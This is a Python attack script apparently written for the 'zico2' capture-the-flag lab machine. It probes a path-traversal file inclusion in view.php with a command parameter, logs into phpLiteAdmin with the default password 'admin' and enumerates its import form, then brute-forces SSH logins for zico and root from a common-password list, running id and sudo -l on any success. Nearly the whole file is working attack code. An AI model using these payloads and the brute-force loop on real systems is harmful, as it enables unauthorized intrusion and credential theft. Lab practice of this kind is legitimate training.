#!/usr/bin/env python3
"""zico2 RCE - Verify if LFI include of SQLite executes PHP or just outputs"""
import requests
import re
import sys
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

s = requests.Session()
s.headers['User-Agent'] = 'Mozilla/5.0'
s.timeout = 15
BASE = 'http://192.168.18.132'

# Test 1: Include SQLite file without command
r1 = s.get(f'{BASE}/view.php?page=../../usr/databases/test_users', timeout=10)
print(f'Without c param: {r1.status_code} ({len(r1.text)}B)')

# Test 2: Include SQLite file with c=id
r2 = s.get(f'{BASE}/view.php?page=../../usr/databases/test_users&c=id', timeout=10)
print(f'With c=id: {r2.status_code} ({len(r2.text)}B)')

# Test 3: Check if output is identical (meaning PHP didn't execute)
if r1.text == r2.text:
    print('Outputs are IDENTICAL -> PHP NOT executing, just text output')
else:
    print('Outputs DIFFER -> PHP might be executing')
    # Show difference
    for i, (c1, c2) in enumerate(zip(r1.text, r2.text)):
        if c1 != c2:
            print(f'  Diff at pos {i}: "{c1}" vs "{c2}"')
            print(f'  Context1: ...{r1.text[max(0,i-20):i+20]}...')
            print(f'  Context2: ...{r2.text[max(0,i-20):i+20]}...')
            break

# The SQLite file header "SQLite format 3\x00" will be output as-is
# PHP won't execute it because it doesn't start with <?php
# 
# CORRECT APPROACH for zico2:
# The LFI includes a file that gets PHP-parsed by the server
# We need to write a file that starts with <?php 
# 
# phpLiteAdmin creates SQLite files which start with binary header
# NOT usable as PHP
#
# The REAL solution: Use phpLiteAdmin's database directory feature
# to change where it stores databases, then create a .php database
# in the web directory
#
# Or: Check if there's a way to write arbitrary files
# through phpLiteAdmin's "Import" or other features

print('\n=== phpLiteAdmin Import feature ===')
PHPLITE = f'{BASE}/dbadmin/test_db.php'
s.post(PHPLITE, data={'password': 'admin', 'remember': 'on', 'login': 'Login', 'proc_login': 'true'})

# Check import view
r = s.get(f'{PHPLITE}?switchdb=%2Fusr%2Fdatabases%2Ftest_users&view=import', timeout=15)
print(f'Import view: {r.status_code} ({len(r.text)}B)')

# Find import form
soup = __import__('bs4', fromlist=['BeautifulSoup']).BeautifulSoup(r.text, 'lxml')
for form in soup.find_all('form'):
    print(f'Form: action={form.get("action")} method={form.get("method")}')
    for inp in form.find_all('input'):
        print(f'  Input: name={inp.get("name")} type={inp.get("type")}')
    for ta in form.find_all('textarea'):
        print(f'  Textarea: name={ta.get("name")}')

# The import feature might allow importing SQL
# We can use SQL to create a table and the dump will be written
# But this doesn't help us write to a web directory

# FINAL APPROACH: brute force check if zico2 SSH accepts the passwords
# Maybe we need to try different credential combinations
print('\n=== SSH brute force with more passwords ===')
import paramiko

passwords = ['zico2215@', '34kroot34', 'zico', 'admin', 'password', 
             'zico123', 'root', 'toor', 'changeme', 'letmein',
             'debian', '123456', 'qwerty', 'abc123', 'monkey',
             'master', 'dragon', 'login', 'princess', 'football']

for user in ['zico', 'root']:
    for pwd in passwords:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect('192.168.18.132', username=user, password=pwd, timeout=5)
            stdin, stdout, stderr = ssh.exec_command('id', timeout=5)
            out = stdout.read().decode().strip()
            if 'uid=' in out:
                print(f'  [+] SSH SUCCESS: {user}:{pwd} -> {out}')
                # Run privilege check
                stdin, stdout, stderr = ssh.exec_command('sudo -l', timeout=5)
                sudo_out = stdout.read().decode().strip()
                print(f'  sudo -l: {sudo_out[:300]}')
                ssh.close()
                break
            ssh.close()
        except:
            pass
    else:
        continue
    break
